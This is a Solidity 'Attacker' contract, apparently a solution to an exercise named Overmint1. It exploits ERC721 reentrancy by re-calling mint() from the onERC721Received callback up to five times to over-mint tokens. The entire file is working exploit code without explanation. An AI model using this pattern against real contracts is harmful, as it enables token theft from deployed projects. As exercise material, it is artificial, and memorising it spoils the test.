// SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import {IERC721} from "@openzeppelin-contracts-5.1.0/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin-contracts-5.1.0/interfaces/IERC721Receiver.sol";

interface Overmint1 is IERC721 {
    function mint() external;
}

contract Attacker is IERC721Receiver {
    Overmint1 victim;
    uint256 private iterations;
    uint256 private constant maxDepth = 5;

    constructor(address address_) {
        victim = Overmint1(address_);
    }

    function initiateAttack() public {
        iterations++;
        victim.mint();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        iterations++;
        if (iterations <= maxDepth) {
            attack();
        }
        return bytes4(IERC721Receiver.onERC721Received.selector);
    }

    function attack() internal {
        victim.mint();
    }
}
